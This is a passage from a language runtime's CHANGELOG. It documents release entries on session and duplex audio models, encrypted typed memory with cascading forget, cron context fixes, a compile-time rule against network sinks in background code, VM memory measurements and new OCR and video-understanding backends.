- **REALITY.md recheck on main `b05d36c` + the credential matrix verification (naryad #414, issue #559)**: the P0-readiness figure recomputed mechanically under the section-3 methodology (same UNVERIFIED weights, readiness per code facts only): **26% → 68%** — the capability model (0% → 85%, the №389–№393 grant algebra), the backend registry (10% → 85%, `BACKEND_REGISTRY` + ladder + per-shard HF pins), and the ledger (35% → 90%, the signed Ed25519 Action Ledger v1) moved from the audit's zero/near-zero band to best-covered; labels (55% → 75%, the lattice + join + taint layer 2) with the honest remainder recorded (effects, affinity, full static inference — the parked P2 items); memory unchanged at 13% (`recall` still a registry stub, the plan-v2 contract still unknown). Section 6 re-verifies every section-2 "missing" verdict with verbatim proof commands (lattice/join now YES; effects/affinity still NO). The credential matrix requirement is verified as ALREADY satisfied by REFERENCE §2.9 (№401): one canonical matrix (purpose / opaque / linear / ledger) with the consent-scope, LikenessToken and Grant rows; the threat model links to it without duplication. CHANGELOG (EN, №383).

- **Held-class decomposition for VM-serve memory (naryad №416, issue #568)**: the ≈4.3–4.6 MB held residual class left by re-gate №2 was decomposed into a measured pre/post component table ([`docs/research/naryad-416-held-class.md`](research/naryad-416-held-class.md) — the inline-body + snapshot-clone duplicate pair ≈ 2.96 MB ≈ 66% of the class, the spike-amplified remainder ≈ 30%, routes/small tables < 1%); the compression levers of its items 3–5 were executed by the follow-up naryad №417 under the owner's path-A decision (one-wave rule, gh#527 comment 5751899756) — this naryad delivered the remaining decomposition item and the honest reconciliation of every task to where it actually lives (docs-only PR #578); re-gate №3 ran as ONE shared series after both (see the retained-compression row).

## [0.22.0] — wave 9, detailed entries

> The wave-9 detailed entries below were released in [0.22.0] (2026-09-22); the duplicated `## [Unreleased]` heading above them was a pre-release draft artifact left behind by the №427 release — retitled to the correct release by №444 (the version-discipline checklist).

### Added

> **Wave 9 — registry Phase 4 "Always-on, память, забывание" (dispatch #598).** Six naryads landed the actor/runtime lane end-to-end: the session model (№348/ADR-0172), the duty-profile compile rule (№349), the typed Memory<K> layer (№350), the derived-from graph with the grant-gated cascading forget and the persistent rusqlite store (№351/ADR-0173), the directed audio effects and the duplex barge-in channel (№352/ADR-0174), and the tick context — cron dispatch in the program context (№426/ADR-0175). Registry 461→484 append-only; four new ADRs (0172–0175); the seed №423 lost its workarounds and the serve-soak stands at 11/0 GREEN.

- **The tick context — the cron dispatch executes in the program context (naryad №426, issue #597, ADR-0175)**: the №423 serve-soak bring-up surfaced four defects of the cron-dispatch context, each worked around in the seed; all four are closed. **The unified executor** (ADR-0175 §3.1): the tick runs on the ROUTE-style program context (`fresh_program_context` — `clone_definitions_into` from the shared interpreter + memory persistence + `reconnect_db`) on `spawn_blocking` (the ADR-0096 posture) while the scheduler holds NO interpreter lock — the tick gets the same stor-set as a route (db{} bound — defect 1), blocking builtins are safe (the №423 http self-call transport failure — defect 2; the self-call loops back into the live server, deterministically reproduced by the `test_tick_self_call` surface), routes are never blocked by a tick, and every failure stays loud through the №413 `CRON_JOB_FAILED`-stamped dispatch error. The №418 contract is untouched (arity 2..5, D1–D6, the pure fire decision, the persisted store; the target resolution order builtin→pattern is byte-identical). **The schema DDL replay discipline** (§3.4, with ADR-0060): `schema{}` declarations are stored on the interpreter (`schemas: Vec<SchemaDecl>`, traveling through `clone_definitions_into` with the other definition classes, UNION by name) and REPLAY additively (`CREATE TABLE IF NOT EXISTS`) on every connection that appears after them — `init_db_connection`, `reconnect_db`, and once after the startup merge in `build_state` — so the declaration ORDER stops mattering (the startup ran each declaration on a conn-less throwaway and swallowed the schema apply; defect 4), a brand-new file DB is schema-ready on first connect, and routes/ticks/the top level see the same schema by construction. **`sqlite::memory:` unified** (§3.3): the startup connection is `Arc`-shared into every fresh context (the existing №381 merge discipline) — routes and ticks see THE SAME memory database; the per-context isolation the seed observed was the symptom of the tick's missing context construction; the seed №423 reverts to `sqlite::memory:` (the nightly soak proves the un-workaround). **The seed**: the workarounds for defects 1/3/4 are REMOVED — the tick performs the granted destructive op IN its own context; the loopback self-call stays out of the seed BY POLICY (the №130 SSRF loopback gate is a deliberate security posture and stays ON; the transport fix is pinned by the test surface). **Test surfaces** (§3.5, public): `test_tick_call` / `test_tick_sequence` (a sequence of ticks on ONE boot — the cross-context contract) / `test_tick_self_call` (a real listener + the self-URL) — the tests assert against the SAME executor the scheduler uses (no 5 s waits, no wall-clock flakes). Mutation verification (№382 protocol, `scripts/mutation_verify_426.sh`): M-CRON-BIND (the tick context's program binding neutered — a bare interpreter) and M-SCHEMA-REPL (the replay neutered) each kill their named test — 2/2 VERIFIED. Tests `tests/naryad_426_cron_context.rs` (4 — the file-DB tick binding + DDL replay + route parity, the memory unification across tick contexts on one boot, the schema-before-db order independence, the live-server self-call). Honest boundaries: the tick context is the TW interpreter construction (the VM serve routes are a separate path, unchanged); the reminder delivery path (Phase 2) keeps its synchronous dispatch closure — the same defect class documented as a deliberate residual (ADR-0175 §4); ADR-0174.

- **Directed audio effects (`listen`/`speak`) and the duplex channel — barge-in over the session priority ladder (naryad №352, issue #595, ADR-0174)**: the voice contour was HALF-duplex — listen/speak were one undirected `io`, interruption untyped, audit lossy. **The typing** (ADR-0174 §3.1-3.2): two directed effect words join the №324/ADR-0154 §9 trail vocabulary — `listen` (audio in: `stt_transcribe`/`whisper_transcribe`/`voice_enroll`, the listen stream) and `speak` (audio out: `tts_generate`/`tts_send`/`tts_speak`, the speak stream; `omni_ask` is BOTH); the words ride the EXISTING trail gate (factual ⊑ declared) so a pattern using an undeclared direction is a COMPILE error — «конфликт направлений без типов — ошибка компиляции» — and a duplex pattern declares both words (the signature IS the duplex type); backward-compatible by construction (only DECLARED trails are gated; no grammar change). The direction SSOT is the semantic-side table (direction is NOT a new №316 classification axis). **The runtime** (§3.3): the duplex channel (`src/duplex.rs`, the session.rs template, NOT feature-gated — the CI contour exercises the same state machine as the serve contour) binds ONE live №348 session (typed SESSION_UNKNOWN otherwise; the priority vocabulary IS the session ladder — no second one); at most ONE active stream per direction (DUPLEX_BUSY); BARGE-IN: an opposite-direction start with rank ≥ the active stream's rank (equal wins) PREEMPTS it — the preempted stream ends TYPED (`InterruptedBy{by, priority}`, observable in the terminal-history slot; the slot is vacated, the direction free again), a LOWER rank refuses (DUPLEX_PREEMPT_DENIED, consuming nothing); stops complete typed (DUPLEX_IDLE when idle); streams are `Active`/`Completed`/`InterruptedBy` — no half-torn state is observable. **Surfaces** (registry 478→484 append-only; .mbc `CallBuiltin` indices stable): `duplex_open(session, priority?)` (direction-neutral), `speak_start(duplex, text, priority?)`/`listen_start(duplex, priority?)`, `speak_stop`/`listen_stop` (SEPARATE surfaces — the direction must be static for the trail to type it), `duplex_state` (metadata-only projection; the speak text NEVER enters the ledger — digest only); the handle is the opaque `Value::Duplex` map (ADR-0114; appended LAST — bincode variant indices stable). **Audit completeness** (§3.4, the acceptance invariant): every transition is a `duplex.*` ledger record; preemption emits TWO (the decision AND the terminal outcome) — interruption loses no audit event BY CONSTRUCTION, pinned by a differential count test scoped to the channel's actor. Voice gates ADR-0145 untouched; real-weights omni stays PARKED (№294 — the duplex is registry-contour semantics, loud in the report). Tests `tests/naryad_352_duplex.rs` (9 — the session binding, the ladder vocabulary, DUPLEX_BUSY, equal-rank barge-in + the typed interruption observable, the lower-rank denial, typed stops + DUPLEX_IDLE, the state projection, the differential ledger count 17/17, the registry presence) and `tests/naryad_352_effects.rs` (6 — the undeclared-speak compile error, the direction conflict, the clean duplex trail, the listen-only trail + the omni both-directions refusal, the static stream directions, the unknown-word loudness); example `examples/w9_duplex.mlog` (golden + TW/VM crosscheck); ADR-0174.

- **The derived-from graph and the cascading forget over Memory<K> (naryad №351, issue #594, ADR-0173)**: №350 recorded `derived_from` as the raw material; this naryad builds the graph and the forgetting on top of it, and closes the Phase 8 "real DB" registry debt for the typed lane. **The graph** (ADR-0173 §3.1-3.2): nodes are entries (container, key), edges are derived_from (child → parent) — a DAG by construction (№350 validates parents BEFORE the child exists); each container carries an incremental children index, so the cascade closure is a BFS costing O(|closure| + |edges inside the closure|) — pinned by EXACT visited counters (one pop per closure node, one scan per closure-internal edge), not wall-clock. **Retain** (§3.3): `memory_retain(handle, key)` pins the descendant closure (the CASCADE retain; reversible via `memory_release`, idempotent, pins survive value overwrites); the protection is a deletion VETO — a retained node inside a forget closure refuses the WHOLE forget (`MEMORY_RETAIN_PROTECTED`, naming the pins, no state change, no grant consumption); the cut-point alternative (spare only the pinned subtree) was REJECTED with a proof — a survivor inside a spared subtree can have a parent in the deleted part (provenance dangling), while the full-closure delete makes P1 (every survivor's parents survive), P2 (completeness) and P3 (isolation) hold by construction. **The grant path** (§3.4): `memory_forget_cascade(handle, key, grant)` is the ADR-0155 linear action — GRANT_MISSING without a grant, scope `memory:forget:<container_id>` (`*` wildcards attenuate; GRANT_SCOPE_MISMATCH otherwise), check_active → plan → veto → apply → grant_use → the post-success `irreversible.memory_forget` ledger record (the db_execute_with_grant template; values never journal — only the count and a SHA-256 digest; batch id `MLOG-TFORGET-<16hex>` per the №280 posture). **The preview**: `memory_cascade_preview(handle, key)` is the №280 dry-run discipline — `{closure, blocked_by}` read-only, no grant touched; `memory_retained(handle)` lists the pins. **Persistence** (§3.5): the env anchor `METALOGOS_MEMORY_DB` (file path) makes a bundled-rusqlite DB the authoritative store behind the transparent write-through cache (load-on-open; unset → byte-for-byte in-process behavior); additive-only DDL per ADR-0060 (`memtyped_containers`/`memtyped_entries`/`memtyped_edges`); private entries persist as the EXACT №350 AES-GCM blobs — restart-stable decryption requires `METALOGOS_MEMORY_MASTER` (loud when absent); unopenable store refuses fail-closed (MEMORY_DB_UNAVAILABLE) instead of silently degrading. **Verification** (§3.7): two-tier fuzzing — a BLOCKING deterministic differential fuzzer (512 seeded DAGs; the real plan must equal an independently re-derived model on P1/P2/P3 + the veto rule; the grant_algebra_fuzz pattern) and a non-blocking cargo-fuzz target (`fuzz_target_memory_cascade`, the fuzz-smoke CI job, 120s); the TRUE cross-process restart test re-execs the test binary as three children against one DB file (write → read+forget → verify — the pins, the encrypted blob under the same master, and the forget itself all persist). Registry 473→478 append-only (.mbc `CallBuiltin` indices stable). Tests `tests/naryad_351_cascade.rs` (13 — closure semantics P1/P2/P3, preview match, the veto keeps the grant usable, cascade retain/release + overwrite survival, the full ADR-0155 refusal matrix, the journal), `tests/naryad_351_cascade_fuzz.rs` (2 — the differential model + the exact-counter O() proof), `tests/naryad_351_persistence.rs` (4 incl. the true 3-process restart); example `examples/w9_memory_cascade.mlog` (golden + TW/VM crosscheck); ADR-0173.

- **Typed Memory<K> — label-typed containers, consent-gated private storage, audited sink reads (naryad №350, issue #593)**: the Phase-4 memory lane — an ADDITIVE layer over the existing memory subsystems (mem_/memorize/recall, FTS5 recall ADR-0093/0094, persistence ADR-0041 — all untouched). `memory_open(subject, label)` opens the `Memory<K>` container (K = the Phase-1 conf word: `public` | `private`; secret/network are loud errors — not storage classes); the handle is an opaque `Value::Memory` (the ADR-0114 pattern; the registry is the state). PRIVATE containers: (1) consent-gated — the open refuses without an ACTIVE consent grant for `memory:<subject>` (№335; the new additive `consent::active_grant_for` reader — the store semantics untouched; MEMORY_CONSENT_REQUIRED otherwise); (2) encrypted AT REST under a PER-SUBJECT key derived from the process master via the existing HMAC-SHA-256/AES-256-GCM contour (NO new crypto; the master is `METALOGOS_MEMORY_MASTER` or fresh per process — the restart boundary is loud); (3) the READ is an audited sink returning `Value::Secret` — the existing lattice refuses its print/egress and `redact()` (№326/ADR-0136) is the legal and ONLY egress path, and the explicit file export of a private entry refuses with MEMORY_REDACT_REQUIRED. Every operation — open/put/read/keys/provenance/export — is an Action-Ledger record (`memory.*` family, best-effort per ADR-0167 §2 driver 5). `memory_put` records the derived-from ORIGIN of the value (validated fail-closed: dangling parents refuse — the raw material of the №351 derived graph, not built here). Classification per the capability precedent: `memory_open`/`memory_put` follow the `db_execute_with_grant` pattern (the handle exists only through the consent-gated open — the authority is enforced at runtime, the №325 static clearance does not apply); `memory_export` stays an Irreversible file-egress sink through the io sandbox. Registry 467→473 append-only (.mbc `CallBuiltin` indices stable; the `Value::Memory` variant is appended last). Tests `tests/naryad_350_memory_typed.rs` (8 — the redact-only private egress, derived-from validation, per-subject at-rest isolation via the cross-decrypt gate, the ledger 100% trail, the consent gate, at-rest representation, public export through the sandbox, fail-closed refusals); example `examples/w9_memory_typed.mlog` (golden + TW/VM crosscheck).

- **Real session surface — wake/interrupt/duty model (naryad №348, issue #591, ADR-0172)**: the Phase-4 registry lane opened — the §16.0-6(б) pillar stubs are replaced by a real session model over a process-global registry (`src/session.rs`). `session_login(user, password)` now mints an opaque `Value::Session` handle (the ADR-0114 pattern; `id`/`user`/`duty` printable projection) backed by live state, `session_logout` actually ends it (removes the registry entry; a second logout is a typed `SESSION_UNKNOWN` refusal — fail-closed, no implicit recreate). NEW surfaces: `session_duty_enter`/`session_duty_exit` (the runtime half of the duty-profile carrier; the static half is the `profile duty { materialization: denied; surfaces: local_only }` declaration validated in the existing closed profile vocabulary — the №349 compile rule keys on the resolved flags), `session_wake(session, source, payload?)` with the closed source vocabulary `keyword|event|schedule` (schedule wakes arrive strictly through the №418 cron payload-dispatch — no new cron surface, SSOT untouched), `session_poll_wake` (FIFO, `Wake{source,payload}` struct or Unit), `session_interrupt(session, priority, reason?)` with the typed ladder `low < normal < high < critical`, and `session_take_interrupt` — the highest-priority-first (FIFO within a rank) preemption lever №352 builds on. Every transition — create, wake, wake_delivered, interrupt, interrupt_taken, duty_enter, duty_exit, end — is an Action-Ledger record (`session.*` action family, the №393/№415 surfaces; best-effort per ADR-0167 §2 driver 5, the grants.rs template). Honest boundaries: credentials are NOT verified (no server user-store exists in the interpreter — a documented boundary, not a stub: state, queues and ledger trail are real); the duty profile's static enforcement (private-handle materialization / network sinks as compile errors) lands with №349. Registry 461→467 append-only (.mbc `CallBuiltin` indices stable). Tests `tests/naryad_348_session.rs` (12 — lifecycle, ledger 100%-coverage via count deltas, closed vocabularies, priority preemption, double-logout refusal, the duty profile resolution); example `examples/w9_session_wake.mlog`; ADR-0172.

- **Action Ledger operator runbook + the verify-branch example (naryad №424, issue #584)**: `docs/ledger-runbook.md` — the operator protocol the audit-21.09 P2-3 asked for: the `METALOGOS_LEDGER_KEY` identity and rotation seams, the export cadence, the OUT-OF-BAND `expect_head`/`expect_key` anchor (the wholesale-rewrite catch — the tamper-EVIDENT boundary stated honestly), the periodic verification via the native cron (№418: a minute-window job whose handler branches on the STRUCT `ledger_verify` verdict, never on message prose), the reaction protocol on `ok=false` (stop destructive, alert with `error_record`/`error_reason`, freeze, recover, re-anchor), and the known boundaries (read-only hook, the vacuous empty-ledger case, the cron-context db boundary observed on 0.21.0 and filed on #583). The runnable example `examples/w7_ledger_cron_verify.mlog` + `.expected` (golden-tested, both backends via crosscheck): a metered N(1) grant, its granted use, the refused second use journaled as a deny event, the export, and the `verify-ok,records=4` branch.

### Security

- **The duty-profile compile rule — the background contour is statically safe (naryad №349, issue #592; the carrier landed by №348/ADR-0172 §3.4)**: `profile duty { materialization: denied }` makes the text-MATERIALIZATION of private-labeled values (the canonical lifts `str`/`json_encode`) a COMPILE error with the data path named (DUTY_MATERIALIZATION — the №325 sink gate cannot see these: the materializers are Pure/Lift, the result may never egress, duty refuses the lift itself); `profile duty { surfaces: local_only }` makes every Network-class builtin (the №316 SSOT class list: http_post/http_get/send_message/git_push/…) a COMPILE error (DUTY_NETWORK_SINK). The rule engages ONLY through the `profile duty` declaration — not a compiler flag: programs without it are untouched by construction (the 214+ example corpus and `profile legacy` stay green), and `profile legacy` does NOT downgrade the duty classes (the deepfake-gate posture — a program declaring duty and violating it is contradictory regardless of the compatibility profile). Leak-suite: +5 duty negatives (n30–n34: str/json_encode materialization, http_post/http_get/send_message from the background) and +2 positives (ok_17: the redact-before-storage legal flow with the №350 typed container; ok_18: fully public local compute) — the corpus now 32 negatives / 17 positives. Tests `tests/naryad_349_duty_profile.rs` (6 — the rule mechanics, the declaration-only engagement, the legacy non-downgrade with Severity::Error findings, the DUTY_* compile-path promotion, TW/VM parity of the positive).
### Fixed

- **Mutants-smoke killer covers the whole json.rs surface (gh#580 finding, 2026-09-21 smoke run 35597601411)**: the weekly non-blocking `cargo mutants -f src/builtins/json.rs -- --test property_json_roundtrip` failed because the killer pinned only `json_encode`/`json_get` while the file ships five more builtins (`parse_json`, `has_field`, `dict_set`, `dict_keys`, `dict_values`, `dict_has`) — every mutant there survived BY CONSTRUCTION (the smoke runs the killer against ALL mutants of the file), and the `Compute mut-score` trend step fell with it. Fix: extend the killer, not the code — J5 (`parse_json ∘ json_encode` string-stability from the second round on; the documented 1-ulp first-encode quirk restated), J6 (`has_field` exact 1.0/0.0 including the documented fields-only navigation asymmetry vs `json_get`), J7 (dict store consistency — set/has/keys/values/overwrite, parse-back restore, second-round stability), J8 (`parse_json` on arbitrary text — value or loud error, never a panic). Mutation verification per the №382 protocol (`scripts/mutation_verify_580.sh`): M-DICT-SET (dict_set stores Unit) and M-HAS-FIELD (present answered absent) each kill their named property — 2/2 VERIFIED. The property file is now 256 cases × 7 properties (docs/testing-evidence.md updated); until the next scheduled run (Monday 06:00 UTC) the mut-score trend stays honestly INVALID per the issue's discipline.

- **README truth-up: the P0-readiness line follows REALITY.md (naryad №421, issue #581)**: the README still carried the stale `(26%) — Naryad №318` estimate after №414 recomputed the working P0-readiness figure to **68%** (2026-09-20) — the README may lag the limitations/REALITY SSOT only by hours, and this was the last docs lag the 2026-09-21 audit (P0-1) listed; the README line now cites 68% with the #414 anchor.
- **CHANGELOG/ADR-0141/limitations post-wave truth-up (naryad №422, issue #582)**: the wave-6/7 rows that shipped inside the v0.21.0 tag were moved verbatim from `[Unreleased]` into `[0.21.0]` (the release section previously carried only the cron row); the held-class decomposition (№416, PR #578) received its missing row; the retained-compression row now cites naryad №417 (issued as №415 before the 2026-09-21 renumbering — issue #569); ADR-0141 Addendum 6's title label aligned to №417 with the historical `415` file/marker anchors documented (the research doc, the test file and the gh#527 comment IDs keep their pre-renumbering names — renaming would break the anchors); the limitations.md MCP tool-method row was rewritten to the closed gh#536 posture (PR #546: the tool-method env/exec gates live, the Category A startup gate on every transport, the VM-only runtime sink backstop stated as the honest boundary).
- **Fosved-class serve-soak — the nightly `mlog serve` soak with real cron, grants and ledger (naryad №423, issue #583)**: the audit-21.09 P0-2 ask — the existing soak.yml was the Stage-2 parity soak (№373) and never ran `mlog serve`; the new `serve-soak` job boots the release binary on the VM DEFAULT (ADR-0171) with a Fosved-class seed (`scripts/soak/serve_seed/app.mlog`): a native-cron minute tick (№418 windows/dedup/payload), a granted destructive path under a scoped metered grant (`GRANT_USE` ledger events), 200 latency probes of a db+ledger route, RSS sampling, and the external `mlog ledger verify --json` verdict on the exported chain — 11 GREEN/RED criteria in the report, any red fails the nightly job. Two honest platform findings recorded on the issue: the cron-dispatch context does not bind the program's db block, and a blocking http self-call from inside a tick fails at the transport level.

## [0.20.1] - 2026-09-20

### Added

- **Stage 5 re-gate №2 — the №398 protocol series on the compressed VM (naryad #410, issue #555, ADR-0141 Addendum 5)**: the fresh re-gate Addendum 3 promised, on main @ `434a871` (precondition: №409 in main), divisor declared before the runs (=14, claim `w5: n410-claim` in issue #527 per protocol rule 2), 3 consecutive pinned `workflow_dispatch` runs (rounds=30, no env flags, repo-versioned workflow unmodified since №404), all `success`. Latency gate (p95 ≥ ×1.5): **3/3 PASS** ×3.32/×3.83/×3.09 — the margin WIDENED vs №404 (the №409 per-request compression is also a latency lever). Memory gate (peak RSS ≤ ×1.1): **0/3 FAIL** ×1.126/×1.128/×1.129 (№404 was ×1.136/×1.143/×1.129) → **verdict NOT flip-ready**; thresholds untouched (rule 2), the serve default remains the interpreter, the pool remains opt-in. The series record with exact `rss_peak_kb` values and run links: `docs/research/naryad-410-stage5-regate2.md`. The residual CI-runner gap (VM − TW ≈ 4.3–4.6 MB) is pinned down as a RETAINED class (compiled `Arc<Program>` bytecode + 14 compiled route bodies + shared-cache snapshots vs TW's AST) that per-request compression cannot move — the honest next lever (retained-representation shrink: route-body laziness, snapshot compaction, priced AST-vs-bytecode delta) and the alternative latency-vs-memory trade are recorded for the owner's decision in issue #527 (the executor does not flip).
- **VM-serve peak-RSS decomposition + footprint compression (naryad #409, issue #554, ADR-0141 Addendum 4)**: Step A decomposed the VM-serve per-request footprint by state class on the pinned №398/№404 fixture (probe-per-process RSS-slope method, `examples/rss_decomposition.rs` + `scripts/rss_decomposition.sh`): the builtins registry rebuild (~70 KB per `Vm::new`) and the unconditional in-memory sqlite open + schema DDL (~86 KB per request, paid even by the 12/14 routes that never touch the db) dominated; the pool's idle set held a LIVE sqlite connection per idle VM (~236 KB each). Step B applied the two measured-effective candidates: **C1** — the immutable builtins registry and name table are now process-wide `Arc`s on the VM path (read-only everywhere on VM; `override_handler` stays Interpreter-only, the TW benchmark baseline untouched); **C2** — the per-request db connection opens LAZILY on first db access (`Vm::ensure_db_open`): `load_program` records the URL and takes the shared schema-DDL snapshot (`Program::schema_ddl_shared`), semantics identical to the eager open (same WAL pragma, same DDL tolerance, same log lines, same legacy access error, fail-fast per VM generation on connect failure), the №381 per-VM isolation and the fail-closed `reset_for_reuse` drop-first contract unchanged. Measured (pinned fixture, same machine): `Vm::new` 70→17 KB, load 76→19 KB, pooled idle VM 236→56 KB (connection-free), bench RSS ratio VM/TW ×1.08–1.11 → ×0.96–1.03 with the p95 margin WIDER (×4.7–4.9 → ×6.9–9.7) — thresholds untouched, serve default unflipped (the fresh re-gate is №410), candidates with no pinned-fixture effect (C3 vision/origin decl sharing, C4 lazy reflex/vision models — the fixture declares none) recorded and NOT applied. New invariants pinned red→green in `mod n409_tests` (load defers; db-free route never opens; db route opens + DDL on first access; fail-fast legacy message; registry `Arc::ptr_eq` process-wide; pooled reset rests connection-free) and mutation-verified per the №382 protocol (M1 re-eager, M2 un-share, M3 keep-connection-across-reset each killed their named test).
- **The video-understanding class — `video_understand` + `BackendClass::VideoUnderstanding` + three canon donors with real HF pins (naryad #408, wave 4.5, the perception-recognition directive)**: video COMPREHENSION joins the perception set (image understanding №334, OCR #407; generation was №307/№309 — understanding was the missing modality). The donor contract is #407's `ocr_extract`, mirrored end to end: `BackendClass::VideoUnderstanding` (`"video-understanding"`) in the §7.6 class set — the `backend_select` ladder accepts it loud on both ends; three `BACKEND_REGISTRY` entries with REAL per-shard pins (HF LFS oid sha256, HF tree API 2026-09-20): `qwen2.5-vl-7b-instruct` (Qwen/Qwen2.5-VL-7B-Instruct, 5 shards), `llava-video-7b-qwen2` (lmms-lab/LLaVA-Video-7B-Qwen2, 4 shards), `internvl3-8b` (OpenGVLab/InternVL3-8B, 4 shards) — full per-shard manifests in `WEIGHTS_SOURCES` (the loader verifies EVERY shard; the registry pin IS the primary shard's hash). License classification per the ACTUAL repo declaration (ADR-0163 §2.1): all three declare Apache-2.0 in the HF card metadata; the naryad's "InternVL3 (MIT)" assumption was STALE and is recorded as such (the card declares apache-2.0; no separate LICENSE text ships). `video_understand(segment, prompt?, model?)` (1..3) — `segment` is the segment payload reference (String), `prompt` the comprehension question, `model` defaults to the Qwen canon; class-check against `VideoUnderstanding` (a foreign-class model refuses loud: `is class 'ocr', not video-understanding`); mock-first deterministic golden `[MOCK: video_understand | weights | segment | prompt]`; real mode refuses loudly naming the expected weights artifact (PARKED by hardware, №294). The REAL-MODE frame-sampling policy is fixed in advance (reproducibility contract): deterministic stride over the segment's frame table + first/last anchor frames — no randomness, no wall-clock time. `spec!("video_understand", 1, 3, "video"; ...)` behind `#[cfg(feature = "video")]` (mirrors the №309 video neighbors; registry 459→460 append-only — the name is feature-gated at runtime, so the default-build dispatch surface is unchanged). REFERENCE rows (builtins + classification), limitations PARKED row. Evidence: `src/video/understand.rs` tests (6 — the mock golden determinism, arity/type loudness, unknown model, class-mismatch, the real-mode refusal naming `model-00001-of-00005.safetensors`, the registry/pin/manifest canon + parse round-trip) run in the `video-tests` CI job; mutation verification (№382 protocol): pulling the `"video-understanding"` parse arm turned the registry/pin test red (1 failed); removing the class-check turned the class-mismatch test red (1 failed) — both reverted, suite green.

- **Persistence taint layer 2 — locally-bound key prefixes are resolved; points-to explicitly deferred (naryad #405, issue #528, wave 4, ADR-0170)**: the №386 cross-module persistence-taint MVP resolved a memory key's prefix from the INLINE call-site expression only, so the office's real key shape — a key built in a local first (`let key = "rate_limit:" + provider`, app.mlog:579; `"model_cost:" + model + ":" + direction`, app.mlog:707; `"legal_jx_" + jurisdiction`, dept/legal.mlog:325 — the №395 dogfood corpus) — slipped every matcher as an `Ident`. The persistence-taint walkers (writer side: `collect_tainted_memory_writes_stmts`/`_expr` feeding `PatternSummary::tainted_memory_keys` + the direct tool/route/hook walk; reader side: `recall_taint_walk_stmts` + the reachability walk) now thread a per-scope binding map `var → prefix` (`resolve_memory_key_prefix`): string literals, concatenation heads (which recurse through the RESOLVER, so chained bindings compose — `let k1 = "p:" + id; let k2 = k1 + ":summary"` names `"p:"`) and bound `Ident`s resolve; RHS is scanned in the PRE-statement environment (runtime evaluation order); fail-closed forks — an unresolvable re-assignment KEEPS the seen prefix, branch bodies share the enclosing map (monotone, the recall walker's taint-var convention), a FRESH map per scope (bindings never leak across patterns/tool methods/routes/hooks). ADR-0170 records the strategy: variant (1) prefix taint chosen, variant (2) `METALOGOS_TAINT_STRICT` stays opt-in as is (the serve default is an owner decision outside the naryad), variant (3) points-to/full-fixpoint explicitly deferred to Phase 7 with the office-corpus justification. No new error codes (the finding stays `TAINT_PERSISTENCE`, the message names the matched prefix and the layer). Evidence: `tests/naryad_405_taint_prefix_bindings.rs` (6 tests — the office shape end-to-end, chained bindings, the fail-closed re-assignment, branch-monotone bindings, the sanitized/LLM-free green paths, the №386 inline-literal pins replay); leak corpus `examples/leak/n405_a_writer_binding` (+`.error`) / `n405_b_reader_binding` (+`.error`) / `ok_405_binding_plain` (+`.expected`); №386 pin tests and №376 depth tests stay green; overhead raw numbers on a production-like fixture published in the issue. limitations.md boundary row + ADR index updated (index gap-filled for 0167-0169 en route).

- **The OCR class — `ocr_extract` + `BackendClass::Ocr` + the canon `trocr-base-printed` registry entry (naryad #407, wave 4.5, owner directive 2026-09-19 "…нужно создать возможность распознавание текстов")**: text extraction FROM an image joins the perception set (image understanding №334, STT/omni №334 — OCR was the missing recognition modality; video understanding is №408's). The donor contract is №334's `vision_understand`, mirrored end to end: `BackendClass::Ocr` (`"ocr"`) in the §7.6 class set — the `backend_select` ladder accepts it loud on both ends (the №336 semantic companion and the runtime both list `ocr` in their available-classes messages); a registry entry (`trocr-printed`, weights_id `trocr-base-printed`, microsoft/trocr-base-printed — MIT, LicenseClass::Osi) with a REAL pin — the HF LFS oid (sha256) of `model.safetensors` fetched via the HF tree API 2026-09-20 — plus the mandatory per-file manifest in `WEIGHTS_SOURCES` (the whisper-pin pattern: the registry pin IS the primary artifact's hash); the `ocr_extract(image, lang?, model?)` builtin (`src/vision/ocr.rs`, category `vision`, 1..3 args) — mock-first with the deterministic 4-field golden `[MOCK: ocr_extract | <weights> | <image> | <lang>]` (the omitted `lang` is an empty field, never a shorter line), `model` → lowercase `weights_id` → `find_by_weights_id` → class-check against `Ocr` (a foreign-class model refuses loud: `is class 'vision-understanding', not ocr`), and real mode refuses loudly naming the expected weights artifact (PARKED by hardware, №294 — no inference is promised); the №316 classification joins as Source/Internal/Pure (regenerated SSOT, registry 458→459 append-only — bytecode indices stable); REFERENCE regenerated (including a pre-existing stale `recall_top_k` row from the №530 doc-comment drift), limitations.md carries the OCR PARKED line. Boundaries held: existing classes untouched, OCR is reading/understanding NOT generation (no Art. 50 synthetic marking), no new taint/grant mechanics. Evidence: `tests/naryad_407_ocr.rs` (7 tests — the class-word round-trip + registry pin, the weights-plan DRY RUN (HF-shaped URL, pinned sha, byte count), the mock golden on TW+VM with a determinism re-run, class-mismatch + unknown-model loudness, the real-mode PARKED refusal naming `model.safetensors`, the ladder selecting `trocr-printed/mock/trocr-base-printed` + the compile-error available-list naming `ocr`, and the limitations pin). Mutation verification (№382 protocol): pulling the `"ocr"` arm from `BackendClass::parse` turned (1)+(6) red (2 failed); removing the `vision::ocr` class-check turned (4) red — both reverted, suite green.

- **VM-serve divisor step B — the warm VM pool behind a fail-closed reset, contract-tested on every state class (naryad #403, issue #526, wave-4 dispatch #529)**: after step A (#402) the per-request VM path still paid `Vm::new()` (the allocation-heavy builtins registry) plus the `load_program` setup on every request. The pool (`src/vm_pool.rs`) recycles `Vm` objects across `spawn_blocking` threads: a checkout pops an idle VM or cold-builds one (`Vm::new` + `load_program` — indistinguishable from the pre-pool path), and a checkin lands in the bounded idle set ONLY after a route execution that returned `Ok` — an error discards the VM, a panic never reaches the pool (the `JoinError` unwind drops it), and a VM whose reset fails is discarded, never stored: fail-closed, not best-effort reuse (the #381 shared-DB bug is the cautionary precedent). The reset itself is `Vm::reset_for_reuse` (`src/vm.rs`): the db connection is dropped FIRST (its in-memory content, transactions and temp state die with it — `load_program` re-opens and re-runs the schema DDL exactly as a fresh per-request VM pays today), every mutable state class NOT wholesale-reassigned by `load_program` is explicitly cleared with a per-class comment (execution scratch and value registers, the runtime label env, memory store and relations, media/vision artifacts, distill states, the STALE DENY EVENT — a survivor would let `deny_reason()` succeed outside a handler, a forged security read — plus serve-path learnables, audit log, conversations, event stream + id counter, pattern stats and the per-request server context), and then `load_program` wholesale-rebuilds the program-scoped tables (globals slots, shared snapshots of patterns/rules/skill indices/deny handlers, model re-registration on the cleared tables). The enumeration is compiler-enforced: `vm_state_enumeration` destructures EVERY `Vm` field with no `..` rest — adding a mutable field without handling its reset breaks the build (the canary the naryad demanded); field-level dirty-reset equivalence tests assert observational equality with a fresh `new()+load_program` VM (including the #381 canary: a dirty connection's leaked table is gone 